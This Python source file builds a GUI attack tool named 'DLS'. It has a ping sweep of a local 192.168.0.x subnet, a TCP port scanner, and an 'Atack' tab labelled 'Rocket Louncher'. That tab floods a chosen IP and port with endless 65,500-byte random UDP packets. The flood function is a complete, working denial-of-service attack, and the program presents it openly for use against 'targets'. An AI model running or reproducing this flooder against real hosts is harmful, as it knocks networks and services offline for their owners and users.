import socket
import random
import threading
import customtkinter

from PIL import Image
from ping3 import ping

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Port Finder Tab

def writePortsInBox():
     global isAnalysing, AnalyseProgress, entryAnalyseIp, textBoxAnalyse, buttonAnalyse
     
     buttonAnalyse.configure(text="Stop Analysing")
     textBoxAnalyse.delete("0.0", "end")
     line = 0
     for port in range(1, 1023):
          if not isAnalysing:
               break
          
          sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
          sock.settimeout(0.001)
          AnalyseProgress.set(port/1023)
          try:
               sock.connect((entryAnalyseIp.get(), port))
               textBoxAnalyse.insert("0."+str(line), str(port)+"\n")
          except:
               pass
     
     buttonAnalyse.configure(text="Find Ports")
     AnalyseProgress.set(0)

def startAnalysing():
     global analyseThred, isAnalysing, entryAnalyseIp
     if not isIPValid(entryAnalyseIp.get()):
          return 0
     analyseThred = threading.Thread(target=writePortsInBox)
     isAnalysing = True
     analyseThred.start()

def stopAnalysing():
     global analyseThred, isAnalysing
     isAnalysing = False

def toggleAnalyse():
     global isAnalysing
     if isAnalysing:
          stopAnalysing()
     else:
          startAnalysing()

#Search Targets Tab

def writeTargetsInTextBox():
     netAddr = "192.168.0." #potentiell variabel
     global textBoxTargets, isSearchAktive, findTargetsButton,SearchProgress, terminateSearch
     terminateSearch = False
     findTargetsButton.configure(text="End Search")
     textBoxTargets.delete("0.0", "end")
     line = 0
     for i in range(1,255):
          if terminateSearch:
               return 0

          SearchProgress.set(i/254)
          ip = netAddr + str(i)
          print("scanning: " + str(ip))
          isthere = ping(ip, timeout=0.2)
          if isthere:
               try:
                    hostName = socket.gethostbyaddr(ip)
                    textBoxTargets.insert("0."+str(line), ip + ":\t" + hostName[0] + "\n")
               except:
                    textBoxTargets.insert("0."+str(line), ip + ":\n")

               line = line + 1

     resetLayout()

def resetLayout():
     global findTargetsButton,SearchProgress, isSearchAktive
     findTargetsButton.configure(text="Start Search")
     SearchProgress.set(0)
     isSearchAktive = False

def startSearch():
     global searchThread, isSearchAktive
     searchThread = threading.Thread(target = writeTargetsInTextBox)
     isSearchAktive = True
     searchThread.start()

def endSearch():
     global searchThread, isSearchAktive, terminateSearch
     terminateSearch = True
     resetLayout()
     

def togleSearch():
     global isSearchAktive
     if isSearchAktive:
          endSearch()
     else:
          startSearch()

# ATK Tab

def isIPValid(ip):
     ipArray = ip.split(".")
     if len(ipArray) != 4:
          return False
     for oktet in ipArray:
          if int(oktet) > 255 or int(oktet) < 0:
               return False
     
     return True

def atk():
     global isActive, entryIp, entryPort
     bytes = random._urandom(65500)
     ip = entryIp.get()
     try:
          port = int(entryPort.get())
     except:
          port = 80

     i = 0
     while isActive:
          sock.sendto(bytes,(ip, port))
          print("send package " + str(i))
          i = i + 1

def startAtk():
     global atkThread, isActive, startButton, entryIp
     if not isIPValid(entryIp.get()):
          return 0
     
     atkThread = threading.Thread(target=atk)
     isActive = True
     startButton.configure(text = "Stop Atack")
     atkThread.start()

def stopAtk():
     global isActive, atkThread, startButton
     isActive = False
     startButton.configure(text = "Start Atack")
     if atkThread != "":
          atkThread.join()
     atkThread = ""

def toggleState():
     global isActive
     if isActive:
          stopAtk()
     else:
          startAtk()

def cleanUp():
     stopAnalysing()
     endSearch()
     stopAtk()
     root.destroy()

isActive = False

atkThread = ""
searchThread = ""
analyseThred = ""
isSearchAktive = False
terminateSearch = False
isAnalysing = False

#GUI
customtkinter.set_appearance_mode("dark")
customtkinter.set_default_color_theme("green")

root = customtkinter.CTk()
root.protocol("WM_DELETE_WINDOW", cleanUp)
root.title("DLS")
root.iconbitmap('image.ico')
root.geometry("500x550")

tabview = customtkinter.CTkTabview(master=root)

tabview.add("Local Targets")
tabview.add("Target Analyser")
tabview.add("Atack")

##atk Tab
frameAtk = customtkinter.CTkFrame(master=tabview.tab("Atack"))
label = customtkinter.CTkLabel(master=frameAtk, text="Rocket Louncher", font=("Roboto", 24))
entryIp = customtkinter.CTkEntry(master=frameAtk, placeholder_text="Target Ip")
entryPort = customtkinter.CTkEntry(master=frameAtk, placeholder_text="Target Port")
startButton = customtkinter.CTkButton(master=frameAtk, text="Start Atack", command=toggleState)

#Targets Tab
frameTarget = customtkinter.CTkFrame(master=tabview.tab("Local Targets"))
labelTargets = customtkinter.CTkLabel(master=frameTarget, text="Target Radar", font=("Roboto", 24))
textBoxTargets = customtkinter.CTkTextbox(master=frameTarget, height=200, width = 350)
SearchProgress = customtkinter.CTkProgressBar(frameTarget, orientation="horizontal")
SearchProgress.set(0)
findTargetsButton = customtkinter.CTkButton(master=frameTarget, text="Start Search", command=togleSearch)

#Analyse Tab
frameAnalyse = customtkinter.CTkFrame(master=tabview.tab("Target Analyser"))
labelAnalyse = customtkinter.CTkLabel(master=frameAnalyse, text="Target Analyser", font=("Roboto", 24))
textBoxAnalyse = customtkinter.CTkTextbox(master=frameAnalyse, height=200, width = 350)
entryAnalyseIp = customtkinter.CTkEntry(master=frameAnalyse, placeholder_text="Target IP")
AnalyseProgress = customtkinter.CTkProgressBar(frameAnalyse, orientation="horizontal")
buttonAnalyse = customtkinter.CTkButton(master=frameAnalyse, text="Find Ports", command= toggleAnalyse)
AnalyseProgress.set(0)



#atk Tab
tabview.pack()
frameAtk.pack(pady = 20, padx = 60)
label.pack(pady = 20, padx = 60)
entryIp.pack(pady = 20, padx = 60)
entryPort.pack(pady = 20, padx = 60)
startButton.pack(pady = 20, padx = 60)

#Local Targets Tab
frameTarget.pack()
labelTargets.pack(pady= 20, padx = 20)
textBoxTargets.pack(pady= 20, padx = 20)
SearchProgress.pack(pady = 20, padx = 60)
findTargetsButton.pack(pady = 20, padx = 60)

#Analyse Tab
frameAnalyse.pack()
labelAnalyse.pack(pady= 20, padx = 20)
textBoxAnalyse.pack(pady= 20, padx = 20)
AnalyseProgress.pack(pady= 20, padx = 20)
buttonAnalyse.pack(pady= 20, padx = 20)
entryAnalyseIp.pack(pady= 20, padx = 20)

#bgLabel.pack()

root.mainloop()